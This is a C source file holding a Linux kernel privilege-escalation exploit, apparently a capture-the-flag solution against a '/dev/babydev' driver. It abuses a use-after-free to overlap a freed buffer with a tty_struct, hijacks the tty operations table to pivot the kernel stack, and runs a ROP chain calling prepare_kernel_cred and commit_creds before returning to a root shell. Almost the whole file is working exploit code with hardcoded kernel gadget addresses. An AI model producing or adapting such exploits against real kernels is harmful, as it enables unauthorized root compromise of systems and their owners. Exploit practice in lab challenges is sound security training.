#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdint.h>

unsigned long user_cs, user_ss, user_rflags, user_sp;

unsigned long prepare_kernel_cred = 0xffffffff810a1810;
unsigned long commit_creds = 0xffffffff810a1420;
unsigned long pivot_gadget = 0xffffffff814f5359;
unsigned long pop_rdi = 0xffffffff810d238d;
unsigned long pop_rdx = 0xffffffff81440b72;
unsigned long mov_rdi_rax_mov_rbp_rsp_call_rdx = 0xffffffff81177909;
unsigned long swapgs_pop_rbp = 0xffffffff81063694;
unsigned long iretq = 0xffffffff8181a797;

/*
0xffffffff814f5359 : mov esp, 0x1740100 ; ret
0xffffffff810d238d : pop rdi ; ret
0xffffffff81440b72 : pop rdx ; ret
0xffffffff81063694 : swapgs ; pop rbp ; ret
0xffffffff81177909 : mov rdi, rax ; mov rbp, rsp ; call rdx
*/

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

void shell(){
    system("/bin/sh");
}

int main(){
    int fd1, fd2, ptmx;
    unsigned long fake_tty_struct[4], tmp[4];
    void *fake_tty_operations[30];
    unsigned long *fake_stack;

    save_state();

    fake_stack = mmap(0x1740000-0x8000, 0x10000, PROT_READ|PROT_WRITE, 0x32 | MAP_POPULATE, -1, 0);
    fake_stack += (0x8100/8);
    *fake_stack++ = pop_rdi;
    *fake_stack++ = 0;
    *fake_stack++ = prepare_kernel_cred;
    *fake_stack++ = pop_rdx;
    *fake_stack++ = commit_creds;
    *fake_stack++ = mov_rdi_rax_mov_rbp_rsp_call_rdx;
    *fake_stack++ = 0;
    *fake_stack++ = swapgs_pop_rbp;
    *fake_stack++ = 0;
    *fake_stack++ = iretq;
    *fake_stack++ = &shell;
    *fake_stack++ = user_cs;
    *fake_stack++ = user_rflags;
    *fake_stack++ = user_sp;
    *fake_stack++ = user_ss;

    fake_tty_operations[7] = pivot_gadget;

    fd1 = open("/dev/babydev", O_RDWR);
    fd2 = open("/dev/babydev", O_RDWR);

    ioctl(fd1, 0x10001, 0x2e0);
    close(fd1);

    ptmx = open("/dev/ptmx", O_RDWR|O_NOCTTY);
    read(fd2, fake_tty_struct, 0x20);
    fake_tty_struct[3] = &fake_tty_operations;

    write(fd2, fake_tty_struct, 0x20);
    write(ptmx, tmp, 8);
}
